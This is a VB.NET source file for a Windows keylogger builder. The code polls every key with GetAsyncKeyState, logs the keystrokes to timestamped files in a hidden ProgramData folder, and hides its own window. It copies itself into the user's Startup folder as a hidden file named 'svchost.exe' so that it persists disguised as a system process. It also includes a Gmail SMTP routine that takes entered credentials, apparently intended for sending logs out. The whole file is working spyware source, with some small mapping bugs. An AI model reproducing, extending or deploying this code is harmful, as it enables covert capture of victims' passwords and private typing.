Imports System.Net.Mail
Imports System.IO

Public Class Setup
#Region "Strings/Objects/Dims..."
    Public Declare Function GetAsyncKeyState Lib "user32" (ByVal vKey As Int32) As Int16
    Private Declare Function GetKeyState Lib "user32" (ByVal nVirtKey As Integer) As Short
    Dim keyPressed As Object
    Dim FilePath As String = "C:\Programdata\settings_s"
    Dim charCount As Int32
    Dim lineLimit As Int32 = 6923
    Dim addKey As Object
    Dim Stored As String
#End Region
    Private Sub TestWrite()
        Try
            If System.IO.File.Exists(FilePath) = True Then
                Dim objWriter As New System.IO.StreamWriter(FilePath + "\testwrite.txt")
                objWriter.Write("Test")
                objWriter.Close()
                MsgBox("Succefully wrote text", MsgBoxStyle.Information)
            Else
                Dim objWriter As New System.IO.StreamWriter(FilePath + "\testwrite.txt")
                objWriter.Write("Test")
                objWriter.Close()
                MsgBox("Succefully wrote text", MsgBoxStyle.Information)
            End If
        Catch ex As Exception
            MessageBox.Show(ex.Message)
        End Try
    End Sub
    Private Sub Username_MouseDown(sender As Object, e As MouseEventArgs) Handles Username.MouseDown
        If Username.Text = "example@gmail.com" Then
            Username.Text = ""
        End If
    End Sub
    Private Sub Password_MouseDown(sender As Object, e As MouseEventArgs) Handles Password.MouseDown
        If Password.Text = "Password" Then
            Password.Text = ""
            Password.PasswordChar = "●"
        End If
    End Sub
    Private Sub BoosterCheckBox1_CheckedChanged(sender As Object, e As EventArgs) Handles BoosterCheckBox1.CheckedChanged
        If BoosterCheckBox1.Checked = True Then
            Password.PasswordChar = ""
        ElseIf BoosterCheckBox1.Checked = False Then
            Password.PasswordChar = "●"
        End If
    End Sub
    Private Sub TestGmail()
        Try
            Dim Mail As New MailMessage
            Dim SMTP As New SmtpClient("smtp.gmail.com")
            '  Dim attachment As System.Net.Mail.Attachment
            Mail.Subject = "Test"
            Mail.From = New MailAddress(Username.Text)
            SMTP.Credentials = New System.Net.NetworkCredential(Username.Text, Password.Text)
            Mail.To.Add(Username.Text)
            '  attachment = New System.Net.Mail.Attachment()
            '   Mail.Attachments.Add(attachment)
            Mail.Body = "This is a test" 'Message 
            SMTP.EnableSsl = True
            SMTP.Port = "587"
            SMTP.Send(Mail)
            MsgBox("Email works", MsgBoxStyle.Information)
        Catch ex As Exception
            MsgBox(ex.Message, MsgBoxStyle.Critical)
        End Try
    End Sub
    Private Sub BoosterButton1_Click(sender As Object, e As EventArgs) Handles BoosterButton1.Click
        '//Test Button
        If BoosterRadioButton1.Checked = True Then
            '//Gmail 
            TestGmail()
        ElseIf BoosterRadioButton2.Checked = True Then
            '//FTP

        ElseIf BoosterRadioButton3.Checked = True Then
            '//Local
            TestWrite()
        End If
    End Sub

    Private Sub BoosterButton2_Click(sender As Object, e As EventArgs) Handles BoosterButton2.Click
        If FolderBrowserDialog1.ShowDialog = Windows.Forms.DialogResult.OK Then
            Dim path As String = FolderBrowserDialog1.SelectedPath
            TextBox1.Text = path + "\settings_s"
            Directory.CreateDirectory(TextBox1.Text)
            Dim objWriter As New System.IO.StreamWriter(TextBox1.Text + "\test.txt")
            objWriter.Write("test")
            objWriter.Close()
            ' System.IO.File.Create(filepath).Dispose()
        End If
    End Sub
    Private Sub BoosterButton3_Click(sender As Object, e As EventArgs) Handles BoosterButton3.Click
        If BoosterCheckBox2.Checked = True Then
            Try
                Dim file1 As String = Application.ExecutablePath
                Dim copy1 As String = "C:\Users\" + Environment.UserName.ToString + "\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\svchost.exe"
                If File.Exists(copy1) Then
                Else
                    System.IO.File.Copy(file1, copy1)
                End If
            Catch ex As Exception
                MsgBox(ex.Message)
            End Try
            Dim copy12 As String = "C:\Users\" + Environment.UserName.ToString + "\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\svchost.exe"
            Threading.Thread.Sleep(100)
            Dim t As New FileInfo(copy12)
            t.Attributes = FileAttributes.Hidden
        End If


        MessageBox.Show("Keylogger has been built, Restart to apply changes.")
    End Sub
    Private Sub CheckifMade()
        If System.IO.Directory.Exists(FilePath) = True Then
            Me.Opacity = 0
            Me.WindowState = FormWindowState.Minimized
            Timer1.Start()
        Else
            Directory.CreateDirectory(FilePath) ' Create folder named "settings_s"
            Me.Opacity = 100
        End If
    End Sub

    Private Sub Setup_FormClosing(sender As Object, e As FormClosingEventArgs) Handles Me.FormClosing
        Dim timeStamp As String
        timeStamp = Format(Now, "dd-MM-yyyy hh-mm-ss tt")
        Dim sw As New System.IO.StreamWriter(FilePath + "\" + timeStamp + ".txt")
        For Each sLine As String In Logs.Lines
            sw.WriteLine(sLine)
        Next
        sw.Close()
        Logs.Text = ""
    End Sub
    Private Sub Setup_Load(sender As Object, e As EventArgs) Handles MyBase.Load
        CheckifMade()
    End Sub
#Region "Logger/Shift/Cap"
    Public Function getCapslock() As Boolean
        getCapslock = CBool(GetKeyState(System.Windows.Forms.Keys.Capital) And 1)
    End Function
    Public Function getShift() As Boolean
        getShift = CBool(GetAsyncKeyState(System.Windows.Forms.Keys.ShiftKey))
    End Function
    Private Sub Timer1_Tick(sender As Object, e As EventArgs) Handles Timer1.Tick

        On Error Resume Next

        'F2
        keyPressed = GetAsyncKeyState(113)
        If keyPressed = -32767 Then
            charCount = 0
            addKey = ""
            GoTo KeyFound
        End If
        'F10

        keyPressed = GetAsyncKeyState(121)
        If keyPressed = -32767 Then
            charCount = 0
            addKey = ""
            GoTo KeyFound
        End If

        'check Enter key
        keyPressed = GetAsyncKeyState(13)
        If keyPressed = -32767 Then
            charCount = 0
            addKey = vbCrLf
            GoTo KeyFound
        End If

        'check for backspace
        keyPressed = GetAsyncKeyState(8)
        If keyPressed = -32767 Then
            TextBox1.Text = TextBox1.Text.Substring(0, TextBox1.Text.Length - 1)
            charCount += 4

        End If

        'check for space bar
        keyPressed = GetAsyncKeyState(32)
        If keyPressed = -32767 Then
            addKey = " "
            GoTo KeyFound
            charCount += 1
        End If

        'check for colon/semicolon
        keyPressed = GetAsyncKeyState(186)
        If keyPressed = -32767 Then
            If getShift() = False Then
                addKey = ";"
            Else
                addKey = ":"
            End If
            GoTo KeyFound
            charCount += 1
        End If

        'check for =/+
        keyPressed = GetAsyncKeyState(187)
        If keyPressed = -32767 Then
            If getShift() = False Then
                addKey = "="
            Else
                addKey = "+"
            End If
            GoTo KeyFound
            charCount += 1
        End If



        'check for ,/<
        keyPressed = GetAsyncKeyState(188)
        If keyPressed = -32767 Then
            If getShift() = False Then
                addKey = ","
            Else
                addKey = "<"
            End If
            GoTo KeyFound
            charCount += 1
        End If

        'check for -/_
        keyPressed = GetAsyncKeyState(189)
        If keyPressed = -32767 Then
            If getShift() = False Then
                addKey = "-"
            Else
                addKey = "_"
            End If
            GoTo KeyFound
            charCount += 1
        End If

        'check for ./>
        keyPressed = GetAsyncKeyState(190)
        If keyPressed = -32767 Then
            If getShift() = False Then
                addKey = "."
            Else
                addKey = ">"
            End If
            GoTo KeyFound
            charCount += 1
        End If

        'check for //?
        keyPressed = GetAsyncKeyState(191)
        If keyPressed = -32767 Then
            If getShift() = False Then
                addKey = "/"
            Else
                addKey = "?"
            End If
            GoTo KeyFound
            charCount += 1
        End If

        'check for `/~
        keyPressed = GetAsyncKeyState(192)
        If keyPressed = -32767 Then
            If getShift() = False Then
                addKey = "`"
            Else
                addKey = "~"
            End If
            GoTo KeyFound
            charCount += 1
        End If

        'check for 0/)
        keyPressed = GetAsyncKeyState(96)
        If keyPressed = -32767 Then
            If getShift() = False Then
                addKey = "0"
            Else
                addKey = ")"
            End If
            GoTo KeyFound
            charCount += 1
        End If

        'check for 1/!
        keyPressed = GetAsyncKeyState(97)
        If keyPressed = -32767 Then
            If getShift() = False Then
                addKey = "1"
            Else
                addKey = "!"
            End If
            GoTo KeyFound
            charCount += 1
        End If

        'check for 2/@
        keyPressed = GetAsyncKeyState(98)
        If keyPressed = -32767 Then
            If getShift() = False Then
                addKey = "2"
            Else
                addKey = "@"
            End If
            GoTo KeyFound
            charCount += 1
        End If

        'check for 3/#
        keyPressed = GetAsyncKeyState(99)
        If keyPressed = -32767 Then
            If getShift() = False Then
                addKey = "3"
            Else
                addKey = "#"
            End If
            GoTo KeyFound
            charCount += 1
        End If

        'check for 4/$
        keyPressed = GetAsyncKeyState(100)
        If keyPressed = -32767 Then
            If getShift() = False Then
                addKey = "4"
            Else
                addKey = "$"
            End If
            GoTo KeyFound
            charCount += 1
        End If

        'check for 5/%
        keyPressed = GetAsyncKeyState(101)
        If keyPressed = -32767 Then
            If getShift() = False Then
                addKey = "5"
            Else
                addKey = "%"
            End If
            GoTo KeyFound
            charCount += 1
        End If

        'check for 6/^
        keyPressed = GetAsyncKeyState(102)
        If keyPressed = -32767 Then
            If getShift() = False Then
                addKey = "6"
            Else
                addKey = "7"
            End If
            GoTo KeyFound
            charCount += 1
        End If

        'check for 7/&
        keyPressed = GetAsyncKeyState(103)
        If keyPressed = -32767 Then
            If getShift() = False Then
                addKey = "7"
            Else
                addKey = "&"
            End If
            GoTo KeyFound
            charCount += 1
        End If

        'check for 8/*
        keyPressed = GetAsyncKeyState(104)
        If keyPressed = -32767 Then
            If getShift() = False Then
                addKey = "8"
            Else
                addKey = "*"
            End If
            GoTo KeyFound
            charCount += 1
        End If

        'check for 9/(
        keyPressed = GetAsyncKeyState(105)
        If keyPressed = -32767 Then
            If getShift() = False Then
                addKey = "9"
            Else
                addKey = "("
            End If
            GoTo KeyFound
            charCount += 1
        End If

        'other num/special chars
        keyPressed = GetAsyncKeyState(106)
        If keyPressed = -32767 Then
            If getShift() = False Then
                addKey = "*"
                charCount += 1
            Else
                addKey = ""
            End If
            GoTo KeyFound
        End If

        keyPressed = GetAsyncKeyState(107)
        If keyPressed = -32767 Then
            If getShift() = False Then
                addKey = "+"
            Else
                addKey = "="
            End If
            GoTo KeyFound
            charCount += 1
        End If

        keyPressed = GetAsyncKeyState(108)
        If keyPressed = -32767 Then
            addKey = ""
            GoTo KeyFound
        End If

        keyPressed = GetAsyncKeyState(109)
        If keyPressed = -32767 Then
            If getShift() = False Then
                addKey = "-"
            Else
                addKey = "_"
            End If
            GoTo KeyFound
            charCount += 1
        End If

        keyPressed = GetAsyncKeyState(110)
        If keyPressed = -32767 Then
            If getShift() = False Then
                addKey = "."
            Else
                addKey = ">"
            End If
            GoTo KeyFound
            charCount += 1
        End If

        keyPressed = GetAsyncKeyState(111)
        If keyPressed = -32767 Then
            addKey = "/"
            GoTo KeyFound
            charCount += 1
        End If

        keyPressed = GetAsyncKeyState(2)
        If keyPressed = -32767 Then
            If getShift() = False Then
                '     addKey = "/"
            Else
                addKey = "?"
            End If
            GoTo KeyFound
            charCount += 1
        End If

        keyPressed = GetAsyncKeyState(220)
        If keyPressed = -32767 Then
            If getShift() = False Then
                addKey = "\"
            Else
                addKey = "|"
            End If
            GoTo KeyFound
            charCount += 1
        End If

        keyPressed = GetAsyncKeyState(222)
        If keyPressed = -32767 Then
            If getShift() = False Then
                addKey = "'"
            Else
                addKey = Chr(34)
            End If
            GoTo KeyFound
            charCount += 1
        End If

        keyPressed = GetAsyncKeyState(221)
        If keyPressed = -32767 Then
            If getShift() = False Then
                addKey = "]"
            Else
                addKey = "}"
            End If
            GoTo KeyFound
            charCount += 1
        End If

        keyPressed = GetAsyncKeyState(219)
        If keyPressed = -32767 Then
            If getShift() = False Then
                addKey = "["
            Else
                addKey = "{"
            End If
            GoTo KeyFound
            charCount += 1
        End If

        'check for a-z upper and lower case
        For i = 65 To 128
            keyPressed = GetAsyncKeyState(i)
            If keyPressed = -32767 Then
                If getShift() = False Then
                    If getCapslock() = True Then
                        addKey = UCase(Chr(i))
                    Else
                        addKey = LCase(Chr(i))
                    End If
                Else
                    If getCapslock() = False Then
                        addKey = UCase(Chr(i))
                    Else
                        addKey = LCase(Chr(i))
                    End If
                End If
                GoTo KeyFound
                charCount += 1
            End If
        Next i

        For i = 48 To 57
            keyPressed = GetAsyncKeyState(i)
            If keyPressed = -32767 Then
                If getShift() = True Then
                    Select Case Val(Chr(i))
                        Case 1
                            addKey = "!"
                        Case 2
                            addKey = "@"
                        Case 3
                            addKey = "#"
                        Case 4
                            addKey = "$"
                        Case 5
                            addKey = "%"
                        Case 6
                            addKey = "^"
                        Case 7
                            addKey = "&"
                        Case 8
                            addKey = "*"
                        Case 9
                            addKey = "("
                        Case 0
                            addKey = ")"
                    End Select
                Else
                    addKey = Chr(i)
                End If
                GoTo KeyFound
                charCount += 1
            End If
        Next i

        System.Windows.Forms.Application.DoEvents()
        Exit Sub

        'keyfound
KeyFound:
        If charCount > lineLimit Then
            charCount = 0
            Logs.AppendText(vbCrLf)
        End If
        If addKey <> "" Then Logs.AppendText(addKey)
        System.Windows.Forms.Application.DoEvents()
    End Sub
#End Region

    Private Sub SendLogs_Tick(sender As Object, e As EventArgs) Handles SendLogs.Tick
        '// After 5 minutes log.
        Dim timeStamp As String
        timeStamp = Format(Now, "dd-MM-yyyy hh-mm-ss tt")
        Dim sw As New System.IO.StreamWriter(FilePath + "\" + timeStamp + ".txt")
        For Each sLine As String In Logs.Lines
            sw.WriteLine(sLine)
        Next
        sw.Close()
        Logs.Text = ""
    End Sub
End Class